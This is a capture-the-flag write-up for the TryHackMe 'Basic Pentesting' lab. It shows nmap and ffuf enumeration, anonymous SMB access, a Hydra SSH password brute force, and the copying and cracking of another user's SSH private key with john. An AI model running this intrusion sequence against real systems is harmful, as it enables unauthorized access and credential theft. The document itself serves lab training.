# Basic Pentesting
![tryhackme_logo](https://user-images.githubusercontent.com/83867734/185771149-cb02c6f2-8476-4ab3-a626-cca8db0a08bf.png)

Difficulty: **Easy**

Tags
--
* brute forcing 
* hash cracking 
* service enumeration
* Linux Enumeration

Tools used
--
* nmap
* ffuf
* smbclient
* hydra
* ssh
* linpeas
* ssh2john
* john

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Athena OS
* IP Address: 10.18.98.39

Victim:
* Name: victim_machine
* IP Address: 10.10.202.26
* Other information must be gathered during the attack

Phase 1: Enumeration
--
```
sudo nmap -sS -sC -sV 10.10.202.26 -p- -vvv

<SNIP>
Initiating SYN Stealth Scan at 05:11
Scanning 10.10.202.26 [65535 ports]
Discovered open port 139/tcp on 10.10.202.26
Discovered open port 445/tcp on 10.10.202.26
Discovered open port 80/tcp on 10.10.202.26
Discovered open port 8080/tcp on 10.10.202.26
Discovered open port 22/tcp on 10.10.202.26
Discovered open port 8009/tcp on 10.10.202.26
Completed SYN Stealth Scan at 05:13, 81.84s elapsed (65535 total ports)
Initiating Service scan at 05:13
Scanning 6 services on 10.10.202.26
Completed Service scan at 05:13, 13.35s elapsed (6 services on 1 host)
NSE: Script scanning 10.10.202.26.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:13
Completed NSE at 05:13, 5.24s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:13
Completed NSE at 05:13, 0.40s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:13
Completed NSE at 05:13, 0.00s elapsed
Nmap scan report for 10.10.202.26
Host is up, received reset ttl 63 (0.047s latency).
Scanned at 2022-08-21 05:11:56 CEST for 102s
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDZXasCfWSXQ9lYiKbTNkPs0T+wFym2lZy229LllhY6iDLrjm7LIkhCcrlgnJQtLxl5NPhlHNVmwhlkcPPiAHwluhMVE5xKihQj3i+Ucx2IwiFvfmCz4AKsWlR6N8IZe55Ltw0lcH9ykuKZddg81X85EVsNbMacJNjjyxAtwQmJt1F5kB1B2ixgjLLOyNWafC5g1h6XbEgB2wiSRJ5UA8rOZaF28YcDVo0MQhsKpQG/5oPmQUsIeJTUA/XkoWCjvXZqHwv8XInQLQu3VXKgv735G+CJaKzplh7FZyXju8ViDSAY8gdhqpJommYxzqu9s1M31cmFg2fT5V1z9s4DP/vd
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP0SXJpgwPf/e9AT9ri/dlAnkob4PqzMjl2Q9lZIVIXeEFJ9sfRkC+tgSjk9PwK0DUO3JU27pmtAkDL4Mtv9eZw=
|   256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAzy8ZacWXbPGeqtuiJCnPP0LYZYZlMj5D1ZY9ldg1wU
80/tcp   open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       syn-ack ttl 63 Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        syn-ack ttl 63 Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -39m58s, deviation: 2h18m34s, median: -1h59m59s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2022-08-20T21:13:35-04:00
| nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   BASIC2<00>           Flags: <unique><active>
|   BASIC2<03>           Flags: <unique><active>
|   BASIC2<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-08-21T01:13:34
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 46318/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 16349/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 27050/udp): CLEAN (Failed to receive data)
|   Check 4 (port 36022/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
<SNIP>
```

Question: **What is the name of the hidden directory on the web server(enter name without /)?**
```
ffuf -u http://10.10.202.26/FFUF -H 'Host: 10.10.202.26' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' -H 'Sec-GPC: 1' -w /usr/share/payloads/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FFUF

development             [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 41ms]
```

Question: **What is the username?**

On `http://10.10.202.26/development` we have two files. `dev.txt` contains:
```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```
so, probably the the usernames start with K and J. Furthermore, we can check for SMB. `j.txt` file adds as information that username starting with J has weak password.

Let's check SMB (port 445 opened):
```
smbclient -L \\\\10.10.202.26\\ -N
Can't load /etc/samba/smb.conf - run testparm to debug it

Sharename       Type      Comment
---------       ----      -------
Anonymous       Disk      
IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
SMB1 disabled -- no workgroup available
```
Note, you can also use `//10.10.202.26/`.
Then:
```
smbclient \\\\10.10.202.26\\Anonymous -N
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 19 19:31:20 2018
  ..                                  D        0  Thu Apr 19 19:13:06 2018
  staff.txt                           N      173  Thu Apr 19 19:29:55 2018

		14318640 blocks of size 1024. 11088544 blocks available
smb: \> get staff.txt
getting file \staff.txt of size 173 as staff.txt (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
smb: \> exit
```
Now `cat staff.txt` and you will get the two usernames: Jan and Kay.

Question: **What is the password?**

The only points where we can use `jan` username are the SMB service and SSH service. Use bruteforce by Hydra for SSH:
```
hydra -l jan -P rockyou.txt 10.10.202.26 ssh

<SNIP>
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.202.26:22/
[STATUS] 146.00 tries/min, 146 tries in 00:01h, 14344255 to do in 1637:29h, 13 active
[STATUS] 106.67 tries/min, 320 tries in 00:03h, 14344081 to do in 2241:16h, 13 active
[STATUS] 95.14 tries/min, 666 tries in 00:07h, 14343735 to do in 2512:40h, 13 active
[22][ssh] host: 10.10.202.26   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-21 05:38:06
```
The password is `armando`.

Question: **What service do you use to access the server?**

SSH

Question: **What is the name of the other user you found?**

kay

Phase 2: Foothold
--
Question: **What is the final password you obtain?**

Let's login by SSH as jan:
```
ssh 10.10.202.26 -l jan
```
Bring inside the target machine `linpeas.sh`. You can copy and paste the content directly on a new file you create by `vi`. Since you cannot use `chmod +x`, you can run it by `source linpeas.sh`.

By running LinPEAS, we get as information the presence of `/home/kay/.ssh/id_rsa`. We can access to it by `jan` user. Let's save this key to the attacker machine. Then, on the attacker machine:
```
chmod 600 id_rsa

ssh -i id_rsa 10.10.202.26 -l kay

sign_and_send_pubkey: signing failed for RSA "I don't have to type a long password anymore!" from agent: agent refused operation
Enter passphrase for key 'id_rsa':
```
It is asking for passphrase. Without it we cannot access by SSH with Kay username.

Let's use John for cracking it:
```
python2 /usr/bin/ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --format=SSH --wordlist=rockyou.txt

<SNIP>
beeswax          (id_rsa)
<SNIP>
```
Now we can access by SSH with Kay username:
```
ssh -i id_rsa 10.10.202.26 -l kay

sign_and_send_pubkey: signing failed for RSA "I don't have to type a long password anymore!" from agent: agent refused operation
Enter passphrase for key 'id_rsa':beeswax
```
Note: instead of prompt in the shell, you could get also a popup window asking passphrase.

The password is inside the `pass.bak` file in the Kay home folder.